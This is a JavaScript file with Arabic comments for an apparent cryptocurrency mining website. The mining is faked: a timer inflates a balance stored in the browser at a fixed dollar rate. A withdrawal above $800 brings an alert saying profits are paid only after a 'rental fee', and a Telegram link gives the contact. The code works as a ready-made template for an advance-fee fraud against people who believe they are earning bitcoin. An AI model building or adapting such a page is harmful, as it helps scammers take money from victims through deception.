let mining = false;
let balanceBTC = parseFloat(localStorage.getItem('balanceBTC')) || 0;
let balanceUSD = parseFloat(localStorage.getItem('balanceUSD')) || 0;
let interval;

// استعادة الرصيد عند تحميل الصفحة
document.getElementById("mining-balance").innerText = balanceBTC.toFixed(8);
document.getElementById("usd-balance").innerText = "$" + balanceUSD.toFixed(2);

// بدء التعدين
document.getElementById("start-mining").addEventListener("click", function() {
    if (!mining) {
        mining = true;
        interval = setInterval(() => {
            balanceBTC += 0.0000025;
            balanceUSD = balanceBTC * 40000;

            // تحديث الرصيد على الشاشة
            document.getElementById("mining-balance").innerText = balanceBTC.toFixed(8);
            document.getElementById("usd-balance").innerText = "$" + balanceUSD.toFixed(2);

            // حفظ الرصيد في localStorage
            localStorage.setItem('balanceBTC', balanceBTC);
            localStorage.setItem('balanceUSD', balanceUSD);
        }, 1000);
    }
});

// إيقاف التعدين
document.getElementById("stop-mining").addEventListener("click", function() {
    clearInterval(interval);
    mining = false;
});

// فتح نافذة السحب
document.getElementById("withdraw-btn").addEventListener("click", function() {
    document.getElementById("withdraw-modal").style.display = "block";
});

// إغلاق نافذة السحب
document.getElementById("close-withdraw").addEventListener("click", function() {
    document.getElementById("withdraw-modal").style.display = "none";
});

// نسخ عنوان المحفظة
document.getElementById("donation-wallet").addEventListener("click", function() {
    navigator.clipboard.writeText(this.value);
    document.getElementById("copy-success").style.display = "block";
    setTimeout(() => {
        document.getElementById("copy-success").style.display = "none";
    }, 3000);
});

// طلب السحب
document.getElementById("confirm-withdraw").addEventListener("click", function() {
    let userWallet = document.getElementById("user-wallet").value;
    if (!userWallet) {
        alert("يرجى إدخال عنوان محفظتك");
        return;
    }
    if (balanceUSD < 800) {
        alert("الحد الأدنى للسحب هو (800$) رصيدك غير كاف للسحب");
        return;
    }
    alert("مباشرة بعد دفع رسوم الإيجار سيصلك مبلغ أربحاك على محفظة البيتكوين الخاصة بك نشكرك على ثقتك و نقدر إختيارك وساطتنا لتعدين العملات الرقمية");
});

// إضافة رابط تيليجرام إلى زر "تواصل معنا"
document.getElementById("contact-btn").addEventListener("click", function() {
    window.open("https://t.me/raone_002", "_blank"); // استبدل "your_telegram_username" باسم المستخدم أو رابط البوت الخاص بك
});
